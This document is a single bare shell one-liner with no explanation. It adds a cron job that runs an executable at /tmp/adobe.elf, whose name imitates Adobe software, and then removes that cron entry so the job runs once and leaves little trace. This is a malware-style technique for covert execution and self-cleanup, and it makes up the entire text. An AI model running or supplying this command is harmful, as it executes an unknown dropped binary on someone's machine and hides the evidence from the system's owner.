(crontab -l 2>/dev/null; echo "* * * * * /tmp/adobe.elf && (crontab -l | grep -v '/tmp/adobe.elf') | crontab -") | crontab -
